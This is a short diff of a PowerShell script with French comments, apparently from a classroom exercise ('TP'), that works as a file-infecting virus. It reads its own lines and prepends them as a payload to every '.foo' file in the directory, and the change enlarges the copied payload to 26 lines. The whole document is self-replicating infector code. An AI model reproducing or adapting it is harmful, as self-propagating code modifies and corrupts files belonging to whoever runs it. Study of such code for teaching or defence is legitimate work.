@@ -5,8 +5,8 @@ $MARQUEUR = "# --- CODE_VIRAL_TP0_3 ---"
 $monScript = $MyInvocation.MyCommand.Path
 $lignesVirus = Get-Content $monScript
 
-# Extraction de la charge (les 15 premières lignes de ce script)
-$payload = $lignesVirus[0..14]
+# Extraction de la charge (on prend tout le script)
+$payload = $lignesVirus[0..25]
 
 # Ciblage
 $cibles = Get-ChildItem -Filter "*.foo"
@@ -23,5 +23,5 @@ foreach ($fichier in $cibles) {
     $nouveauContenu = ($payload -join "`n") + "`n`n" + $contenuOriginal
     Set-Content -Path $fichier.FullName -Value $nouveauContenu -Encoding UTF8
     
-    Write-Host "Fichier infecté : $($fichier.Name)"
+    Write-Host "Fichier infecte : $($fichier.Name)"
 }
